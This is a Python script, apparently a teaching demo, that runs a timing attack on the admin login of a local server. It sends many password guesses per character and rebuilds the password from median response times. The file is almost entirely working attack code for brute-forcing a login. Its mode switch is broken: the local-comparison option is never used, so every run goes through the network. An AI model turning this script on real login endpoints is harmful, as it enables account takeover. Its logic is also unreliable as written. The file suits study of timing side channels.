import time
import requests
from urllib3.util.retry import Retry
from requests.adapters import HTTPAdapter
from statistics import median
import argparse
from server import ADMIN_PASSWORD

from tqdm import tqdm

DEFAULT_CHARSET = "abc"  # "abcdefghijklmnopqrstuvwxyz"


s = requests.Session()
retries = Retry(total=100,
                backoff_factor=0.1,
                status_forcelist=[500, 502, 503, 504])
s.mount('http://', HTTPAdapter(max_retries=retries))


def send_request(password):
    start_time = time.time()
    req = s.post("http://localhost:5000/admin/login",
                 json={"password": password})
    return req.status_code == 200, time.time() - start_time


def compare_password(password):
    """used to test timings without going through the network"""
    start_time = time.time()
    is_correct = password == ADMIN_PASSWORD
    return is_correct, time.time() - start_time


class PasswordFoundException(Exception):
    def __init__(self, password):
        self.password = password


def next_char(prefix, charset=DEFAULT_CHARSET, iterations=100_000,  try_password=compare_password):
    timings = {}
    for c in charset:
        timings[c] = []
    for i in tqdm(range(iterations * len(charset))):
        c = charset[i % len(charset)]
        is_correct, time = send_request(prefix + c)
        if is_correct:
            raise PasswordFoundException(prefix + c)
        timings[c].append(time)
    print("medians", {k: median(timings[k]) for k in timings})
    return max(timings, key=lambda x: median(timings[x]))


def attack(charset=DEFAULT_CHARSET, iterations=100_000, try_password=compare_password):
    password = ""
    while True:
        try:
            c = next_char(password, charset, iterations)
            password += c
            print("current password:", password)
        except PasswordFoundException as p:
            return p


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='Run a timing attack.')
    parser.add_argument(
        "-i", "--iterations", help="the number of requests to send per letter",
        default=100_000, type=int)
    parser.add_argument("-c", "--charset",
                        help="the letters to that will form the password",
                        default=DEFAULT_CHARSET)
    parser.add_argument("-m", "--mode",
                        help="try the attach through the network or directly via python",
                        default="network")
    args = parser.parse_args()

    password = attack(args.charset, args.iterations,
                      send_request if args.mode == "network" else compare_password)
    print("found a password password!", password)
